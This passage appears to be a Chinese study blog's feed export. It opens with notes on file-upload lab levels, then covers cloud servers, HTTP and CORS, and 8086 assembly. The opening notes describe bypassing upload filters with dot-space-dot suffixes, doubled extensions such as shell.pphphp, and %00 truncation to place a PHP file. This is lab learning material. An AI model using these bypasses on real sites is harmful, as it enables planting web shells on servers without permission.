.)在每一条代码之后过滤，还剩一个点，从而使它不是php文件，从而绕过，而上传之后windows操作系统在处理后缀名时，会删除后缀名中的点，从而得到最终上传上去的php文件</p></blockquote><ul><li>上传文件，burpsuite抓包，然后将文件后缀名最后加上点空格点，然后上传</li></ul><h2 id="Pass-11-后缀双写绕过"><a href="#Pass-11-后缀双写绕过" class="headerlink" title="Pass-11 后缀双写绕过"></a>Pass-11 后缀双写绕过</h2><blockquote><p>查看源码，发现他一旦遇到黑名单里的后缀名，就会将其后缀名替换为空，也就是没有后缀名了，因此双写后缀名，即使去除一个，还有一个后缀名</p></blockquote><ul><li>上传文件，burpsuite抓包，然后将文件后缀名最后加上点空格点，然后上传</li><li>修改文件名为shell.pphphp<ul><li>不能是连续的php，不然都要被去掉</li></ul></li></ul><h2 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12 %00截断"></a>Pass-12 %00截断</h2><h3 id="空字符"><a href="#空字符" class="headerlink" title="空字符"></a>空字符</h3><blockquote><p>（你好 0x00php）php发现了0x00之后就不会读取之后的数据了</p></blockquote><ul><li>0x00：编程语言</li><li>%00：URL编码（ASCII码转化为十六进制，再加上%）</li></ul><blockquote><p>查看源码，这道题是白名单</p></blockquote><ul><li><p>上传jpg文件，burpsuite抓包，然后在文件的保存路径上直接写一个文件，然后%00截断后面的内容，然后上传</p><ul><li><p>jpg是用来通过白名单的</p><p>  <img src="https://pic.imgdb.cn/item/668935e1d9c307b7e95220bc.png"></p></li></ul></li></ul><h2 id="Pass-13-0x00截断"><a href="#Pass-13-0x00截断" class="headerlink" title="Pass-13 0x00截断"></a>Pass-13 0x00截断</h2><p>​</p>]]></content>
      
      
      <categories>
          
          <category> upload注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云云服务器</title>
      <link href="/2024/06/17/a-li-yun-yun-fu-wu-qi/"/>
      <url>/2024/06/17/a-li-yun-yun-fu-wu-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="阿里云-云服务器"><a href="#阿里云-云服务器" class="headerlink" title="阿里云-云服务器"></a>阿里云-云服务器</h1><blockquote><p>云服务器 ECS（Elastic Compute Service）是一种安全可靠、弹性可伸缩的云计算服务，助您降低 IT 成本，提升运维效率，使您更专注于核心业务创新。 专业的售前技术支持，协助您选择最合适配置方案</p></blockquote><h2 id="弹性伸缩"><a href="#弹性伸缩" class="headerlink" title="弹性伸缩"></a>弹性伸缩</h2><p>弹性伸缩（Elastic Scaling service）是根据用户的业务需求和策略，经济地自动调整弹性计算资源的管理服务。弹性伸缩不仅适合业务量不断波动的应用程序，同时也适合业务量稳定的应用程序。免费使用，所需资源按照相关价格计费。</p><p><img src="https://pic.imgdb.cn/item/666fd110d9c307b7e9e5eabd.png"></p><ul><li>弹性：支持<strong>纵向</strong>和<strong>横向</strong>的扩展</li></ul><ol><li>纵向：即单个服务器的配置变更，传统的IDC模式，很难做到对单个服务器进行变更配置。简单来说，就是可以根据业务量增加和减少自由变更自己的配置</li><li>横向：对于游戏应用或直播平台出现的高峰期，若在传统的IDC模式下，根本无法立即准备资源，而云计算却可以使用弹性的方式帮助客户度过这样的高峰。当业务高峰消失时，您可以将多余的资源释放掉，以减少业务成本的开支。</li></ol><h2 id="ECS的优势"><a href="#ECS的优势" class="headerlink" title="ECS的优势"></a>ECS的优势</h2><p><img src="https://pic.imgdb.cn/item/66d478d3d9c307b7e9be0b4c.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>小白图解网络学习笔记</title>
      <link href="/2024/06/07/xiao-bai-tu-jie-wang-luo-xue-xi-bi-ji/"/>
      <url>/2024/06/07/xiao-bai-tu-jie-wang-luo-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="小白图解网络学习笔记"><a href="#小白图解网络学习笔记" class="headerlink" title="小白图解网络学习笔记"></a>小白图解网络学习笔记</h1><p>模型：</p><p><img src="https://pic.imgdb.cn/item/666309395e6d1bfa055281bb.png"></p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="HTTP报文格式"><a href="#HTTP报文格式" class="headerlink" title="HTTP报文格式"></a>HTTP报文格式</h3><ol><li>请求报文</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /cmaskboss/164203142_30_1.enhance.webmask HTTP/1.1</span><br><span class="line">请求方法 URL 协议版本</span><br><span class="line">//Headers头</span><br><span class="line">Host: upos-sz-staticks3.bilivideo.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) </span><br><span class="line">AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: https://www.bilibili.com</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://www.bilibili.com/</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Range: bytes=0-16</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>响应报文</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">协议版本  状态码    状态描述符</span><br><span class="line">//Headers信息</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 17</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Server: Tengine</span><br><span class="line">ETag: "92086de1e6d1d4791fb950a0ac7e30ba"</span><br><span class="line">Date: Sat, 30 Jan 2021 09:31:31 GMT</span><br><span class="line">Last-Modified: Sun, 04 Oct 2020 01:54:28 GMT</span><br><span class="line">Expires: Mon, 01 Mar 2021 09:31:31 GMT</span><br><span class="line">Age: 1018695</span><br><span class="line">Content-Range: bytes 0-16/353225</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">X-Application-Context: application</span><br><span class="line">x-kss-request-id: 75bcbfa8ab194e3c825e89c81a912692</span><br><span class="line">x-kss-BucketOwner: MjAwMDAyMDEwNw==</span><br><span class="line">X-Info-StorageClass: -</span><br><span class="line">Content-MD5: kght4ebR1HkfuVCgrH4wug==</span><br><span class="line">X-Cache-Status: HIT from KS-CLOUD-JH-MP-01-03</span><br><span class="line">X-Cache-Status: HIT from KS-CLOUD-TJ-UN-14-13</span><br><span class="line">X-Cache-Status: HIT from KS-CLOUD-LF-UN-11-25</span><br><span class="line">Access-Control-Allow-Origin: https://www.bilibili.com</span><br><span class="line">Access-Control-Allow-Headers: Origin,X-Requested-With,ContentType,Accept,range</span><br><span class="line">X-Cdn-Request-ID:</span><br><span class="line">7e2c783ca7d392624118593ec1dc66bc</span><br></pre></td></tr></tbody></table></figure><h3 id="Request-URL"><a href="#Request-URL" class="headerlink" title="Request URL"></a>Request URL</h3><p>url：协议://URL：（端口号）/虚拟目录/……（虚拟目录）/文件名？</p><h4 id="URL与URI的区别"><a href="#URL与URI的区别" class="headerlink" title="URL与URI的区别"></a>URL与URI的区别</h4><ul><li><p>URL:Uniform Resource Locator 统⼀资源定位符； </p></li><li><p>URI: Uniform Resource Identifier 统⼀资源标识符；</p></li></ul><p>​URL是URI的子集</p><p>​简单解释下。 假设”小白”(URI)是⼀种资源，”在迪丽亦巴的怀里”表明了一个位置。如果你想要找到（locate）小白， 那么你可以到”在迪丽亦巴怀里”找到小白，而”在迪丽亦巴怀里的/小白”才是我们常说的URL。而”在迪丽亦巴怀里的/小白”（URL）显然是”小白”（URI）的子集，毕竟，”小白”还可能是”在牛亦菲怀⾥的/小白”（其他URL）</p><h3 id="Request-Method"><a href="#Request-Method" class="headerlink" title="Request Method"></a>Request Method</h3><p>请求方法：Get、POST、HEAD、OPTIONS、PUT、DELETE、TRACE 、CONNECT</p><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>请求指定的页面信息，并返回消息主体(body)+头信息(header)。</p><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h4><p>HEAD和GET本质是⼀样的，区别在于HEAD只返回头信息(header)，不返回消息主体(body)</p><ul><li><p>HEAD省下拿body的消耗</p></li><li><p>如果请求的是⼀个⽐较⼤的资源，使用HEAD请求，返回的headers会带有文件的大小，不需要整个下载下来</p></li></ul><h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>POST每次调用都可能会修改数据，是非幂等的，而GET类似于只读，是<u>幂等</u>的。在HTTP规范中POST是<u>非等幂</u>的，多次调用会产生不同的结果</p><ul><li><p>幂等（Idempotent）：指一个操作的重复执行不会产生额外的影响。无论对一个操作进行一次或多次的执行，系统状态都会保持一致。换句话说，多次执行幂等操作所产生的结果与执行一次的结果相同。常见的幂等操作包括GET请求、删除某个资源等。</p></li><li><p>非幂等（Non-Idempotent）：指一个操作的重复执行会导致系统状态发生变化。多次执行非幂等操作可能会对系统产生不同的影响，导致状态发生改变。比如POST请求、创建资源等操作通常是非幂等的。</p></li></ul><h4 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h4><p>创建⼀个用户,由于网络原因或是其他原因多创建了几次,那么将会有多个用户被创建。而PUT id/xiaobai 则会创建一个id为 xiaobai 的用户，多次调用还是会创建的结果是⼀样的，所以PUT是等幂的</p><h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>⼀般实战中如果是删除操作，也是使用POST来替代</p><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><p>用于获取当前URL所支持的方法，若请求成功，则它会在HTTP响应头部中带上给各种“Allow”的头，表明某个请求在对应的服务器中都支持哪种请求方法</p><p><img src="https://pic.imgdb.cn/item/66631c7e5e6d1bfa056c0e04.png"></p><ul><li><p>Response Header里的关键字段</p><p>  <img src="https://pic.imgdb.cn/item/66631cf65e6d1bfa056cba38.png"></p></li></ul><p><strong>跨域</strong>的情况下，浏览器发起<u>复杂请求</u>前会<u>自动发起 options 请求</u></p><h5 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h5><ul><li>请求方法为 GET、HEAD、POST </li><li>只有以下 Headers 字段 <ul><li>Accept </li><li>Accept-Language</li><li>Content-Language </li><li>Content-Type </li><li>DPR/Downlink/Save-Data/Viewport-Width/Width (这些不常见，放在⼀起)</li></ul></li><li>Content-Type 只有以下三种 <ul><li>application/x-www-form-urlencoded </li><li>multipart/form-data </li><li>text/plain</li></ul></li><li>请求中的任意 XMLHttpRequestUpload 对象均没有注册任何事件监听器； </li><li>请求中没有使用 ReadableStream 对象。</li></ul><h5 id="复杂请求"><a href="#复杂请求" class="headerlink" title="复杂请求"></a>复杂请求</h5><ul><li><p>不满足简单请求的，都是复杂请求</p></li><li><p>因为上述请求在获取网上资源的请求Headers里带有 Access-Control-Request-Headers:  range , 而 range 正好不在简单请求的条件2中提到的Headers范围里，因此属于复杂请求，于是触发预检options请求</p></li></ul><p><strong>跨域</strong></p><ul><li>同源：域名、协议、端⼝均相同</li></ul><p>例子：</p><p><img src="https://pic.imgdb.cn/item/66821f6bd9c307b7e92be8e7.png"></p><p><strong>注意</strong>：localhost和127.0.0.1虽然都指向本机，但也不属于同源</p><ul><li><strong><u>非同源</u><strong>之间网页调用就是我们所说的</strong><u>跨域</u></strong></li><li>每次复杂请求前都要使用options询问一次</li></ul><h5 id="如何优化options"><a href="#如何优化options" class="headerlink" title="如何优化options"></a>如何优化options</h5><p>​每次复杂请求前都会调用⼀次options，这其实没有必要。因为大部分时候相同的请求，短时间内获得的结果是不会变的，是否可以通过浏览器缓存省掉这⼀次查询？</p><p>​Access-Control-Max-Age 就是优化这个流程中使用的⼀个Header。它的作用是当你每次请求 options 方法时，服务端返回调用支持的方法（Access-Control-Allow-Methods ）和 Headers（Access-Control-Allow-Headers）有哪些，同时告诉你，它在接下来 Access-ControlMax-Age 时间（单位是秒）里都支持，则这段时间内，不再需要使用options进行请求。</p><p>​特别注意的是， 当 Access-Control-Max-Age 的值为-1时，表示禁用缓存，每⼀次请求都需要发送预检请求，即用 OPTIONS请求进行检测。</p><h5 id="Status-Code（状态码）"><a href="#Status-Code（状态码）" class="headerlink" title="Status Code（状态码）"></a>Status Code（状态码）</h5><p>浏览器向服务器发送请求，服务器则会根据请求作出响应，而状态码则是响应的⼀部分，代表着本次请求的结果。</p><img src="https://pic.imgdb.cn/item/66822309d9c307b7e930bd3a.png" style="zoom: 67%;">]]></content>
      
      
      <categories>
          
          <category> 网络技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全攻防-渗透测试实战指南</title>
      <link href="/2024/06/07/web-an-quan-gong-fang-shen-tou-ce-shi-shi-zhan-zhi-nan/"/>
      <url>/2024/06/07/web-an-quan-gong-fang-shen-tou-ce-shi-shi-zhan-zhi-nan/</url>
      
        <content type="html"><![CDATA[<p>学习资源：<a href="https://www.bilibili.com/video/BV1uT4y1i73u">【MS08067实验室】《Web安全攻防:渗透测试实战指南》全套视频，学安全这一套就够了（零基础入门到就业）_哔哩哔哩_bilibili</a></p><h1 id="Web安全攻防-渗透测试实战指南"><a href="#Web安全攻防-渗透测试实战指南" class="headerlink" title="Web安全攻防-渗透测试实战指南"></a>Web安全攻防-渗透测试实战指南</h1><h2 id="Web基础知识"><a href="#Web基础知识" class="headerlink" title="Web基础知识"></a>Web基础知识</h2><h3 id="Web常见术语"><a href="#Web常见术语" class="headerlink" title="Web常见术语"></a>Web常见术语</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言</title>
      <link href="/2024/06/06/hui-bian-yu-yan/"/>
      <url>/2024/06/06/hui-bian-yu-yan/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h1><h2 id="学习路径-："><a href="#学习路径-：" class="headerlink" title="==学习路径==："></a>==学习路径==：</h2><p>[汇编语言](<a href="https://www.bilibili.com/video/BV1Rs411c7HG%EF%BC%89">https://www.bilibili.com/video/BV1Rs411c7HG）</a></p><h2 id="测试点练习路径-："><a href="#测试点练习路径-：" class="headerlink" title="==测试点练习路径==："></a>==测试点练习路径==：</h2><p><a href="https://hansimov.gitbook.io/asm-lang/solutions/ch01-basics">汇编语言 - 王爽</a></p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><blockquote><p>汇编语言是机器指令便于记忆的的书写格式</p></blockquote><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><ol><li>汇编指令（机器码的助记符）</li><li>伪指令（由编译器执行）</li><li>其他符号（由编译器识别）：+-*÷ 由编译器转换为逻辑运算符（与或非）传给计算机执行</li></ol><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><blockquote><p>存储单元的地址（地址信息）<br>器件的选择，读或写命令（控制信息）<br>读或写的数据（数据信息）</p></blockquote><p>==总线==：连接CPU与其他芯片的导线</p><ol><li><p>地址总线</p><ul><li>通过地址总线来指定存储单元</li><li>一个cpu有N根地址总线，则可以说这个cpu地址总线的宽度位N，最多可以寻找2^n^个存储单元</li><li>64位的速度由64位CPU、64位操作系统、64位软件共同决定</li></ul></li><li><p>数据总线</p><ul><li>数据总线的宽度决定cpu与外界的数据传送速度</li></ul></li><li><p>控制总线</p><ul><li>有多少根控制总线，就意味着cpu提供了对外部器件的多少种控制</li></ul></li></ol><p>==内存地址空间==：</p><p>​假如一个cpu的地址总线宽度为10，那么可以寻址1024个内存单元，这些内存单元就构成了这个cpu的内存地址空间</p><p>==主板==：</p><p>​一个PC有一个主板，包含核心器件和主要器件，这些器件通过总线相连</p><p>==接口卡==：</p><p>​cpu对外部设备不能直接控制，直接控制这些设备进行互作的是插在扩展插槽的接口卡</p><p>==存储器芯片==：</p><ol><li><p>从读写属性上看分为：随机存储器（RAM）和只读存储器（ROM）</p></li><li><p>从功能和连接上分类：</p><ul><li><p>随机存储器RAM</p></li><li><p>装有BIOS的ROM</p><ol><li>BIOS(基本输入输出系统)：由主板和各类接口卡厂商提供的软件系统，可以通过它利用该硬件设备进行最基础的输入输出。cpu与显示器通过显卡；网卡。</li></ol></li><li><p>接口卡上的RAM</p></li></ul></li></ol><p>主板逻辑连接：</p><img src="https://pic.imgdb.cn/item/6662f2ef5e6d1bfa053655fe.png" style="zoom: 67%;"><h2 id="寄存器（CPU工作原理）"><a href="#寄存器（CPU工作原理）" class="headerlink" title="寄存器（CPU工作原理）"></a>寄存器（CPU工作原理）</h2><h3 id="CPU概述"><a href="#CPU概述" class="headerlink" title="CPU概述"></a>CPU概述</h3><blockquote><p>由运算器、控制器、寄存器等器件组成</p></blockquote><h3 id="寄存器概述"><a href="#寄存器概述" class="headerlink" title="寄存器概述"></a>寄存器概述</h3><blockquote><p>8086CPU有14个寄存器</p></blockquote><p>==通用寄存器==：</p><ol><li><p>通用寄存器：AX，BX，CX，DX：存放一般数据</p></li><li><p>8086CPU所有的寄存器都是16位，可以存放两个字节</p></li></ol><p><img src="https://pic.imgdb.cn/item/66651a0f5e6d1bfa05504fc1.png"></p><img src="https://pic.imgdb.cn/item/66651a915e6d1bfa05511a7b.png" style="zoom: 80%;"><ol start="3"><li><p>为保证兼容性，会将这四个16位的寄存器都分别分为两个独立的8位的寄存器（可独立使用），以兼容以前的8位寄存器</p></li><li><p>AX可以分为AH（高位）和AL（低位），BX、CX、DX同理</p></li></ol><p><img src="https://pic.imgdb.cn/item/66651c475e6d1bfa05541995.png"></p><p>==字==：</p><p>一个字=2字节（2B），字高位和低位分别对应寄存器的高位和低位</p><h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><blockquote><p>汇编指令不区分大小写</p></blockquote><p><img src="https://pic.imgdb.cn/item/666526ed5e6d1bfa055e1914.png"></p><p><img src="https://pic.imgdb.cn/item/666550545e6d1bfa058c71bd.png"></p><p>00C5H+93H=0058H（不是0158H，因为高低8位是独立的，不共用，进制位会被单独存放在特点的寄存器）</p><h3 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h3><p>==16位结构的CPU==：</p><ol><li>运算器一次最多可以处理16位的数据</li><li>寄存器的最大宽度位16位</li><li>寄存器和运算器之间的通路是16位</li></ol><p>8086cpu给出物理地址的方法</p><img src="https://pic.imgdb.cn/item/6665596a5e6d1bfa05977392.png" style="zoom:80%;"><p>地址加法器工作原理：</p><p>​合成物理地址的方法：</p><p>​<u>物理地址=段地址*16+偏移地址</u></p><p><img src="https://pic.imgdb.cn/item/66655a625e6d1bfa05987fd4.png"></p><h3 id="段的概念"><a href="#段的概念" class="headerlink" title="段的概念"></a>段的概念</h3><blockquote><p>内存并没有分段，段的划分来自于CPU</p><p>CPU访问内单元时，必须向内存提供内存单元的物理地址</p><p>8086CPU在内部用段地址和偏移地址移位相加的方法形成最终的物理地址</p></blockquote><ul><li>CPU可以用不同的段地址+偏移地址形成同一个物理地址</li></ul><p><img src="https://pic.imgdb.cn/item/66729796d9c307b7e9683f92.png"></p><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><blockquote><p>8086CPU有四个段寄存器：</p><ul><li>CS（代码段寄存器，Code Segment）</li><li>DS（数据段寄存器，Data Segment）</li><li>SS（堆栈段寄存器，Stack Segment）</li><li>ES（附加段寄存器，Extra Segment）</li></ul><p>当8086CPU需要访问内存时，由这4个寄存器提供内存单元的段地址</p></blockquote><p>==CS和IP（指令指针寄存器）==</p><p><img src="https://pic.imgdb.cn/item/6672a236d9c307b7e97b9464.png"></p><p>工作流程：</p><ol><li>从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲区</li><li>IP=IP+所读取指令的长度，从而指向下一条指令</li><li>执行指令，转到步骤1</li></ol><blockquote><p>在8086CPU加电启动时，CS=FFFFH，IP=0000H，即CPU从内存FFFF0H单元中读取指令执行</p></blockquote><p>==修改CS:IP的指令==</p><ul><li><p>mov不能用于设置CS、IP的值</p></li><li><p>同时修改CS、IP:</p></li></ul><p>​而是用转移指令：jmp</p><p>​<u>jmp 段地址:偏移地址</u></p><p>​jmp 2AE3:3 对应物理地址2AE33</p><p>​jmp 3:0B16 对应物理地址0003*16=00030，00030+00B16=00B46</p><ul><li>仅修改IP的内容</li></ul><p>​jmp 某一合法寄存器</p><p>​jmp ax（类似于mov IP,ax）//用寄存器的值修改IP</p><p>练习：</p><img src="https://pic.imgdb.cn/item/6672add2d9c307b7e990a2f6.png" style="zoom:67%;"><p>依次执行：</p><ul><li><p>mov ax,6622H ax=6622</p></li><li><p>jmp 1000:3 </p></li><li><p>mov ax,0000ax=0000</p></li><li><p>mov bx,axbx=0000</p></li><li><p>jmp bx</p></li><li><p>mov ax,0123H         ax=0123</p></li><li><p>执行mov ax,0000 不断循环</p></li></ul><h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><blockquote><p>对于8086PC机，可以根据需求将一组内存单元定义为一个段</p><p>可以将长度为N的一组代码存在一组地址连续、起始地址为16的倍数的内存单元中，这段内存是用来存放代码的，从而定义了一个代码段</p></blockquote><img src="https://pic.imgdb.cn/item/6672b19bd9c307b7e997288c.png" style="zoom:67%;"><p>CS:IP指向代码段，则代码段就被执行，CPU只认CS:IP所指代码段</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><blockquote><p>查看CPU和内存，用机器指令和汇编指令编程</p><p>使用工具：DOSBox</p></blockquote><img src="https://pic.imgdb.cn/item/6672b712d9c307b7e9a01d33.png" style="zoom:67%;"><p>​R:查看、改变CPU寄存器内容</p><p><img src="https://pic.imgdb.cn/item/6673bd69d9c307b7e9544e8c.png"></p><p>T:执行指令</p><p><img src="https://pic.imgdb.cn/item/6673bdfbd9c307b7e9554102.png"></p><p>D:查看内存内容</p><p><img src="https://pic.imgdb.cn/item/6673be4cd9c307b7e955bf8a.png"></p><p>（1）</p><p><img src="https://pic.imgdb.cn/item/6673bf23d9c307b7e9572b6e.png"></p><ol><li>通过-a，将指令输入</li><li>用过-d，来查看内存</li></ol><p><img src="https://pic.imgdb.cn/item/6673c0f3d9c307b7e95a4cb0.png"></p><ol start="3"><li>用u来将指令转换为汇编语言</li></ol><p><img src="https://pic.imgdb.cn/item/6673c15dd9c307b7e95b0087.png"></p><ol start="4"><li>改变CS:IP指向刚刚执行的指令</li></ol><p><img src="https://pic.imgdb.cn/item/6673c3e9d9c307b7e95f838a.png"></p><ol start="5"><li>执行当前指令，发现ax被覆盖，并且IP的值也指向了下一个指令</li></ol><p><img src="https://pic.imgdb.cn/item/6673c431d9c307b7e95ff75c.png"></p><p>（2）将下面3条指令写入从2000:0开始的内存单元中，利用这3条指令计算2的8次方</p><ul><li>mov ax,1</li><li>add ax,ax</li><li>jmp 2000:0003</li></ul><ol><li>-a写入指令</li><li>-r改变CS:IP指向指令内存地址</li><li>-t依次执行</li></ol><p><img src="https://pic.imgdb.cn/item/6673c77ed9c307b7e966d310.png"></p><p>（3）</p><p><img src="https://pic.imgdb.cn/item/6673c89fd9c307b7e968c609.png"></p><ol><li>-d查看，其中30（十六进制）对应0（ASCII），2F（十六进制）对应/（ASCII），依次对应</li></ol><p><img src="https://pic.imgdb.cn/item/6673c9e4d9c307b7e96b591e.png"></p><ol start="2"><li>-e更改，发现无法更改，因为写在ROM中的，为只读</li></ol><p><img src="https://pic.imgdb.cn/item/6673cc10d9c307b7e972caea.png"></p><p>（4）</p><p><img src="https://pic.imgdb.cn/item/6673cc4dd9c307b7e973d476.png"></p><p><img src="https://pic.imgdb.cn/item/6673cce2d9c307b7e9760560.png"></p><p>观察右上角出现图案，是因为在往显存中写数据，所以出现了图案</p><h2 id="寄存器（内存访问）"><a href="#寄存器（内存访问）" class="headerlink" title="寄存器（内存访问）"></a>寄存器（内存访问）</h2><h3 id="内存中字的存储"><a href="#内存中字的存储" class="headerlink" title="内存中字的存储"></a>内存中字的存储</h3><ul><li>任何两个地址连续的内存单元，N号单元和N+1号单元可以看成两个内存单元，也可以看成一个地址为N的<strong>字单元</strong>中的<strong>高位</strong>字节单元和<strong>低位</strong>字节单元</li></ul><img src="https://pic.imgdb.cn/item/66765f31d9c307b7e9198672.png" style="zoom: 67%;"><p>1地址<strong>字单元</strong>的中存放的<strong>字型</strong>数据是<u>124EH</u></p><p>2地址<strong>字单元</strong>的中存放的<strong>字型</strong>数据是<u>0012H</u></p><h3 id="DS和-address"><a href="#DS和-address" class="headerlink" title="DS和[address]"></a>DS和[address]</h3><p>mov指令格式：</p><ul><li>[ ]：表示一个内存单元</li><li>[ ]中的0：表示内存单元中的偏移地址</li></ul><p><img src="https://pic.imgdb.cn/item/66792c60d9c307b7e9c98c40.png"></p><p><strong>注意</strong>：8086CPU不支持将数据直接送入段寄存器（DS）（硬件设计的问题）<br>所以mov ds,1000H是不合法的</p><p><strong>数据–&gt;通用寄存器–&gt;段寄存器</strong> </p><p>如何将数据从寄存器送入内存单元？也就是从内存单元读数据的逆过程，但是注意通过通用寄存器作为中间人</p><p><img src="https://pic.imgdb.cn/item/6679306bd9c307b7e9d22b21.png"></p><h3 id="字的传送"><a href="#字的传送" class="headerlink" title="字的传送"></a>字的传送</h3><blockquote><p>8086CPU是16位结构，有16根数据线，可以一次性传送16位数据（一个字）</p></blockquote><p><img src="https://pic.imgdb.cn/item/66794388d9c307b7e9fa7948.png"></p><ol><li>先写入数据</li></ol><p><img src="https://pic.imgdb.cn/item/66794b09d9c307b7e90b27cd.png"></p><ol start="2"><li>查看寄存器信息，以及CS:IP所指内存地址的信息</li></ol><p><img src="https://pic.imgdb.cn/item/66794c0cd9c307b7e90d7b88.png"></p><ol start="3"><li>写入指令</li></ol><p><img src="https://pic.imgdb.cn/item/6679453fd9c307b7e9ff3aa5.png"></p><ol start="4"><li>执行指令，mov ax,[0]:将DS为1000，偏移量[0]，也就是地址为10000H的值，以及高一个的地址的值传入ax，此处也就是10000H以及10001H的值，因此ax=1123，以此类推</li></ol><p><img src="https://pic.imgdb.cn/item/66794831d9c307b7e904e9dc.png"></p><p>add bx,[1]:将bx的值（6622）加上DS为1000，偏移地址为[1]（也就是10001H的值）及高一个的地址（10002H的值），因此bx=6622H+2211H=8833H，以此类推</p><p><img src="https://pic.imgdb.cn/item/66794964d9c307b7e907d00c.png"></p><p><strong>注意</strong>：如何来看是吧[0]、[1]……当作字节（1字节）来看，还是当作字（2字节）来看</p><ul><li><p>如果为ax则当作字来看，则取当前及上一个的地址</p></li><li><p>如果为al或者ah，则当成字节来看，取当前的地址</p></li></ul><p><img src="https://pic.imgdb.cn/item/6679629dd9c307b7e9450f23.png"></p><ol><li><p>写入数据</p></li><li><p>写入指令（11316为十进制，对应十六进制为2C34；sub指令就是相减）</p></li><li><p>执行指令</p></li></ol><p><img src="https://pic.imgdb.cn/item/667964f1d9c307b7e94b95c7.png"></p><p>sub bx,[2] 就为bx=bx-[2]，所以bx=2c34-1122=1b12，查看内存信息，1b12已经存入内存</p><p><img src="https://pic.imgdb.cn/item/66796671d9c307b7e94fd244.png"></p><h3 id="mov、add、sub指令"><a href="#mov、add、sub指令" class="headerlink" title="mov、add、sub指令"></a>mov、add、sub指令</h3><p>mov:</p><p><img src="https://pic.imgdb.cn/item/66796899d9c307b7e95512ac.png"></p><p>add、sub:</p><img src="https://pic.imgdb.cn/item/66796f40d9c307b7e968dfa4.png" style="zoom: 80%;"><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><blockquote><p>8位为一个字节，16位（2字节）为一个字，32位（4字节）为双字</p></blockquote><p><img src="https://pic.imgdb.cn/item/667cf196d9c307b7e90651fb.png"></p><p><img src="https://pic.imgdb.cn/item/667cff8cd9c307b7e91f5ad7.png"></p><blockquote><p>逻辑地址等于段地址左移4位后加上偏移地址，即逻辑地址 = 段地址 x 16 + 偏移地址</p></blockquote><p><img src="https://pic.imgdb.cn/item/667d0945d9c307b7e932282d.png"></p><ul><li>0001:0000 = 0001 *16 +0000 = 0010</li></ul><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><blockquote><p>push指令：入栈</p><p>pop指令：出栈</p><p>8086CPU的入栈和出栈都是以字为单位进行</p></blockquote><ul><li>push ax：将寄存器ax中的数据送入栈中</li><li>pop ax：从栈顶取出数据送入ax</li></ul><p>入栈：</p><img 